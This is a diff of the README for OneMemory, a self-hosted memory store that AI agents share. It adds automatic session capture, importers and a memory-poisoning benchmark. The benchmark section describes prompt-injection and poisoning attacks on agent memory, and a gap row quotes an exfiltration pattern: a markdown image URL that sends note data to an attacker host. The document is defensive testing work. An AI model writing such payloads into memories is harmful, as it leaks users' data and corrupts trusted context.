@@ -1,6 +1,6 @@
 # OneMemory
 
-**One small, self-hosted memory store that every AI agent you use can share — over MCP or plain REST, from your desktop, the web, or your phone.**
+**Memory you can audit.** One small, self-hosted memory store that every AI agent you use can share — over MCP or plain REST, from your desktop, the web, or your phone. Local, no API keys, no hidden model calls; every memory sourced, versioned and undoable, with [benchmarks](#benchmark) to prove it.
 
 [![CI](https://github.com/calasdan-sketch/onememory/actions/workflows/ci.yml/badge.svg)](https://github.com/calasdan-sketch/onememory/actions/workflows/ci.yml)
 [![npm](https://img.shields.io/npm/v/onememory-mcp)](https://www.npmjs.com/package/onememory-mcp)
@@ -26,7 +26,7 @@ that speaks MCP or HTTP.
 npx onememory-mcp setup
 ```
 
-`setup` finds Claude Code, Claude Desktop and Cursor on this computer, shows you in plain words what it will do and the exact
+`setup` finds Claude Code, Claude Desktop, Cursor, Codex, Gemini CLI, Muse, VS Code and Zed on this computer, shows you in plain words what it will do and the exact
 lines it will change, saves a backup of each file, and writes only after you type `y`. Then it writes a first test note, reads it
 back, runs `onememory doctor` and tells you how to check it inside Claude Code (type `/mcp`). To look first: `npx onememory-mcp setup
 --dry-run`. To go back: `onememory setup --undo`. It changes only the OneMemory entry; your other servers and settings stay as they
@@ -34,7 +34,9 @@ are. **Coming from claude-bridge** (the old name)? It offers to move that entry 
 troubleshooting: [docs/live-claude-code.md](./docs/live-claude-code.md).
 
 Already have notes in Claude Code? `onememory import --claude --dry-run` shows what could be brought in from your `CLAUDE.md` files and
-Claude Code's auto memory (secrets are skipped, nothing leaves your computer).
+Claude Code's auto memory (secrets are skipped, nothing leaves your computer). Coming from claude-mem, mem0 or basic-memory?
+`onememory import --from claude-mem --dry-run` (or `mem0 --path export.json`, `basic-memory`); see [docs/switching.md](./docs/switching.md)
+for the import and a clean uninstall of the old tool.
 
 The manual way, if you prefer:
 
@@ -132,6 +134,83 @@ curl -X POST -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/jso
 - Markdown (one file per note, git-friendly) is a separate path:
   `onememory export --format md --dir ~/memory` — see
   [docs/file-sync.md](./docs/file-sync.md).
+
+---
+
+## Automatic memory
+
+OneMemory can also remember what Claude Code *does*, without anyone writing a note:
+
+```bash
+onememory setup --capture        # or answer y to "Also record what Claude does in this project ...?"
+```
+
+- **What is recorded:** prompts, tool calls, file edits, commands and their errors, through Claude Code's hooks
+  (`onememory hook <event>`). Only on this machine, in the same SQLite file; raw events are deleted after 7 days
+  (`ONEMEMORY_CAPTURE_RETENTION_DAYS`).
+- **What is kept:** a free, deterministic distiller (no model call) turns each session into a few **observations**
+  (a commit typed by its `fix:` / `feat:` / `refactor:` prefix, a test that failed and then passed, a decision you
+  stated, a secret that was kept out) and one **session summary** (request, files, commands, outcome, next step).
+  They are ordinary notes with a `kind`, so lint, quarantine, history, search and the trust policy apply to them,
+  and they never show up in `state_list` / `state_search` unless asked for.
+- **Private by default:** `<private>...</private>` blocks are dropped and secrets are replaced with
+  `[REDACTED:<type>]` *before* anything is stored. `ONEMEMORY_CAPTURE=off` stops it; `ONEMEMORY_CAPTURE_EXCLUDE`
+  skips folders; `ONEMEMORY_CAPTURE_SKIP_TOOLS` skips tools.
+- **Never in the way:** every hook exits 0 and never migrates the database. If the database is busy or from another
+  version, the (already redacted) event waits in a spool file and is stored by a later hook.
+- **Back at the next session:** the start-of-session context is ranked by what you are working on (git branch, changed
+  files, recent work), packed into `ONEMEMORY_RECALL_TOKENS` (1500), and ends with what it stands in for.
+- **Looking things up:** `memory_index` (compact rows) → `memory_timeline` (what happened around one) →
+  `memory_get` (full text, cite as `om:#id`), plus `session_list`. REST: `GET /index`, `GET /timeline`, `POST /get`,
+  `GET /sessions`, `GET /files/timeline?path=`. The [onememory-mem skill](./skills/onememory-mem/SKILL.md) teaches
+  an agent this order.
+- **Before a file is read:** a `PreToolUse` hook on `Read` (`onememory hook file-context`, installed with
+  `--capture`) tells the agent which memories are linked to that file, once per session per file. It is advisory
+  only: it never blocks, allows or changes the Read. Same namespace, trust and UNTRUSTED-banner rules as the
+  start-of-session context.
+- **In the dashboard:** the **Sessions** tab lists recorded sessions; open one for its timeline (summary, prompts,
+  observations, oldest first).
+- **Optional local model:** set `ONEMEMORY_LLM_URL` (an OpenAI-compatible server such as Ollama,
+  `http://127.0.0.1:11434`) and `ONEMEMORY_LLM_MODEL`, and at session end one call rewrites the session summary in
+  plain words. Off by default; only a loopback URL is accepted (`ONEMEMORY_LLM_ALLOW_REMOTE=1` to override); bounded
+  by `ONEMEMORY_LLM_TIMEOUT_MS`; the answer is redacted and linted like any write, and on any failure the automatic
+  summary stays.
+- **Moves with your data:** export / import and the Markdown vault sync carry an observation's kind, session, type
+  and files; `onememory encrypt enable` seals captured event outputs too. Captured rows are left out of the stale
+  count, `memory_stats` totals and consolidation.
+- **Old captured rows fade out:** an observation nobody updated or read for 30 days (`ONEMEMORY_DECAY_DAYS`; summaries
+  180, `ONEMEMORY_DECAY_SUMMARY_DAYS`) is archived, never deleted, by the expiry sweep or at session end. Your own notes,
+  decisions and anything tagged `pinned` never decay. `onememory decay --dry-run` shows what would go; `onememory
+  restore <id>` brings one back; `memory_stats` reports the counts.
+- **Memory quality:** `onememory quality [--json]` (and the dashboard's **Quality** tab, admin token, `GET /quality`)
+  lists near-duplicates, stale notes with a newer twin, quarantined writes, notes the linter flags and rows about to
+  decay, each with the command or button that fixes it. Every fix previews or asks first and can be undone.
+
+**Semantic search when available:** `ONEMEMORY_EMBEDDINGS=auto` uses your local embedding endpoint when it answers
+and quietly stays on keyword search when it does not (it retries once a minute).
+
+`onememory doctor` shows whether the hooks are wired, the last captured event and the spool size;
+`onememory setup --undo` takes the hooks out again.
+
+**At session start** you get a short "What I know about this project" block first (decisions, conventions, key
+files, the last session, open-task count), built from your stored notes with no model, capped at
+`ONEMEMORY_PROFILE_TOKENS` (300) and switched off with `ONEMEMORY_PROFILE=off`. Every memory line then says why it is
+there, in a few characters (`{files,kw 3d}`: linked to files you changed, matches your branch, three days old). A
+memory that keeps showing up without helping: `onememory never-show <id>`, the dashboard's **never show** button, or
+the tag `never-show`. It stays searchable; it is just never injected again.
+
+### What it costs you
+
+OneMemory makes **no hidden model calls**. The only model it ever talks to is the optional local summarizer
+(`ONEMEMORY_LLM_URL`, off by default, one call per session). The meter shows the rest, as aggregate numbers only (no
+prompt or note text is recorded):
+
+- tokens injected at session start, per session and in total, and the tokens of captured work they stood in for;
+- tokens the local summarizer used (0 while it is off);
+- capture events recorded and the database size on disk.
+
+See it in `onememory doctor` (the `footprint:` line), `GET /stats` and `memory_stats` (the `meter` field), and the
+dashboard's **Meter** view. Tokens are estimates at about 4 characters a token.
 
 ---
 
@@ -260,8 +339,9 @@ REST mirrors them (`/notes`, `/search`, `/relevant`, `/changes`, `/tasks`, `/han
 
 ```
 onememory start | mcp | doctor | init
-onememory setup [--dry-run] [--yes] [--only claude-code,claude-desktop,cursor] [--hook] [--undo]   # connect your apps; safe, backed up, undoable
+onememory setup [--dry-run] [--yes] [--only claude-code,claude-desktop,cursor,codex,gemini,muse,vscode,zed] [--hook] [--undo]   # connect your apps; safe, backed up, undoable
 onememory import --claude [--dry-run] [--update] [--project <folder>]   # bring in CLAUDE.md files and Claude Code auto memory
+onememory import --from claude-mem|mem0|basic-memory [--path p] [--dry-run]   # switch from another memory tool (docs/switching.md)
 onememory sync --git ~/my-private-memory-repo [--encrypt]   # keep your computers in step through YOUR private git repository
 onememory changes --since last --consumer laptop
 onememory runner-status                           # is each PC's runner listening? commands waiting?
@@ -274,6 +354,7 @@ onememory export --format json [--attest] --out a.json     onememory import --fi
 onememory supersede --old 12 --title "..." --body "..."   # replace a note: shows what you would lose, asks you to type the count
 onememory supersede undo <id>     onememory history <id> | restore <id> <version> | purge <id>
 onememory quarantine [list | approve <id> | reject <id>]
+onememory quality [--json]     onememory decay [--dry-run]     onememory archive <id> | restore <id>
 onememory consolidate | rebuild-edges | reindex | relevant "…" | recall
 onememory bench [--json] [--suite stale|contradiction|isolation|provenance] [--strict-gaps]   # provenance benchmark (docs/BENCHMARK.md)
 ```
@@ -313,7 +394,7 @@ does not: [docs/trust.md](./docs/trust.md).
 `onememory bench` checks the provenance behaviour a shared agent memory needs: that one agent cannot silently turn a weak
 guess into shared truth. It is deterministic, offline, uses no model, and runs on a throwaway store through the real REST API
 (`npm run bench` from a checkout; `--json` for every scenario with expected vs actual; exit 1 on any failure, so it can gate CI).
-It has four suites, as plain JSON scenario files you can extend in [`bench/scenarios/`](https://github.com/calasdan-sketch/onememory/tree/main/bench/scenarios).
+It has five suites, as plain JSON scenario files you can extend in [`bench/scenarios/`](https://github.com/calasdan-sketch/onememory/tree/main/bench/scenarios).
 
 | Suite | Scenarios | What it checks | Headline number |
 |---|---|---|---|
@@ -321,8 +402,21 @@ It has four suites, as plain JSON scenario files you can extend in [`bench/scena
 | B  Contradiction recovery | 31 | writer A vs writer B, then a trusted correction; distrusting the bad writer; weak overwrite of a trusted note; restoring the trusted text from history; the trust guard on replacing | resolved to the correction, loser stays visible, overwrite protected |
 | C  Permission isolation | 27 | cross-tenant read/write/search/export/import/merge/sweep, token scopes, admin-only flags, signed imports, and (1.6.0) that one tenant cannot read another's history, preview, undo or reuse a confirmation code | `leakage-count` (must be 0), `unexpected-denials` |
 | D  Provenance retention | 19 | source, writer, creator, timestamps, deletion deadline, confidence after export, import, merge, update | `fields-lost` |
+| E  Memory poisoning | 14 | injected or malicious memories never reach an agent as trusted content: prompt-injection (plain, forged tags, zero-width-obfuscated) is quarantined; a distrusted/low-trust writer cannot outrank or silently overwrite a trusted fact; secrets are redacted (capture) or blocked (write); a forged writer/namespace is stamped with the real one; an unsigned import cannot pose as verified; a captured web fetch is not trusted memory; SessionStart injection carries the untrusted-data banner and leaves distrusted notes out; mass near-duplicate flooding cannot bury the answer | `poison-reach-count` (must be 0) |
 
-**What it does not measure.** It is not a retrieval-quality or semantic-search benchmark (keyword search, made-up unique words, no
+**Retrieval quality (2.0.0).** `onememory bench --longmemeval` and `--locomo` score retrieval on the public datasets, with no model
+and no judge (does the right conversation come back?). On one Windows PC, 2026-10-31:
+
+| Dataset | Search | Recall@5 | Recall@10 | Search time (p50) |
+|---|---|---|---|---|
+| LongMemEval-S, 470 questions | keyword (default) | 95.1 % | 97.2 % | 2.7 ms |
+| LongMemEval-S, 470 questions | hybrid (local embeddings) | 96.8 % | 98.5 % | 21 ms |
+| LoCoMo-10, 1,982 questions, by session | keyword (default) | 89.1 % | 95.0 % | 1.3 ms |
+
+These are retrieval numbers, not the end-to-end QA accuracy memory vendors usually publish, so they are not comparable with
+those. Every number, the per-type breakdown, where hybrid is worse, and the caveats: [docs/BENCHMARK.md](./docs/BENCHMARK.md#retrieval-longmemeval-s-and-locomo).
+
+**What it does not measure.** The provenance suites above are not a retrieval-quality or semantic-search benchmark (keyword search, made-up unique words, no
 embeddings). It does not measure speed, scale or concurrency, and "0 leaks" means none of *these* probes leaked; it is a regression gate,
 not an audit. Details and the scenario format: [docs/BENCHMARK.md](./docs/BENCHMARK.md). Another memory system can be tested by
 writing a small adapter (write, update, delete, search, plus the actor: writer and namespace).
@@ -340,7 +434,7 @@ Nothing is deleted, undo is one command, and every edit now keeps the text it re
 [docs/replacing-memories.md](./docs/replacing-memories.md).
 
 **Known gaps.** Scenarios that fail because OneMemory lacks the behaviour are kept, marked, and listed here and in the report. They do not fail the run
-(`--strict-gaps` makes them), and a gap that starts to pass fails the run until its marker is removed. **At 1.6.0 none is open**: the four recorded at 1.5.0 are fixed.
+(`--strict-gaps` makes them), and a gap that starts to pass fails the run until its marker is removed. The four recorded at 1.5.0 are fixed, and so is the one the memory-poisoning suite found (`GAP-POISON-MDLINK`, 2.0.0). **None is open.**
 
 | Gap | What was missing | Status | Scenarios |
 |---|---|---|---|
@@ -349,6 +443,7 @@ Nothing is deleted, undo is one command, and every edit now keeps the text it re
 | `GAP-HISTORY` | No version history of bodies; after a bad overwrite the trusted original was not recoverable from OneMemory. | **Fixed in 1.6.0**: bounded, admin-only history with restore (restore is a new version). | B08, B09 (now pass) |
 | `GAP-REST-CAS` | The REST `PUT /notes/:id` ignored `if_rev`. | **Fixed in 1.5.0**: it takes `if_rev` and answers 409. | B16 (passes) |
 | `GAP-CONFIDENCE` | No confidence field; a client could send one but it was dropped silently. | **Fixed in 1.6.0**: optional, validated, labelled as a claim. | D10 (now passes) |
+| `GAP-POISON-MDLINK` | The write-time linter did not flag markdown images whose URL smuggles note data out (e.g. `![x](https://attacker/p?data=...)`); such a note was stored as ordinary memory. | **Fixed in 2.0.0**: a remote markdown image with a query string is held in quarantine; README badge hosts are exempt. | E11 (now passes) |
 
 ## Security in one paragraph
 
@@ -374,6 +469,14 @@ limits: [SECURITY.md](./SECURITY.md),
 not evidence of retrieval quality. Keyword-only `state_search` scores 0.70
 recall@1 on it. See [docs/encryption-retention.md](./docs/encryption-retention.md#the-evaluation-set).
 
+## Leaves no trace
+
+OneMemory writes to its data folder (`~/.onememory`) and, through `onememory setup`, to the one `onememory` entry in each
+app's config, with a backup beside it. Nothing lands in your projects unless you name the folder (`--project`, `--dir`,
+`--out`, `sync --git`), no `CLAUDE.md` is ever written, and every retry has a limit. `onememory uninstall` takes it out
+of every app (byte for byte where it can), `--purge` also deletes the data after a final backup. Every file, and how to
+remove it: [docs/footprint.md](./docs/footprint.md).
+
 ## Documentation
 
 | | |
@@ -394,6 +497,7 @@ recall@1 on it. See [docs/encryption-retention.md](./docs/encryption-retention.m
 | [docs/token-namespaces.md](./docs/token-namespaces.md) | per-token namespace permissions — one shared bridge, isolated agents |
 | [docs/replacing-memories.md](./docs/replacing-memories.md) | replacing a note in two steps, undo, version history and restore, confidence, the trust guard |
 | [docs/BENCHMARK.md](./docs/BENCHMARK.md) | `onememory bench`: stale memory, contradiction recovery, permission isolation, provenance retention; scenario format; adapting it to another memory system |
+| [docs/footprint.md](./docs/footprint.md) | every file OneMemory writes, where and when, how to remove it; `uninstall`; retry limits |
 | [docs/architecture.md](./docs/architecture.md) | modules, tools, REST API, schema |
 | [SKILL.md](./SKILL.md) | when and how an agent should use the memory |
 | [CHANGELOG.md](./CHANGELOG.md) | release notes |
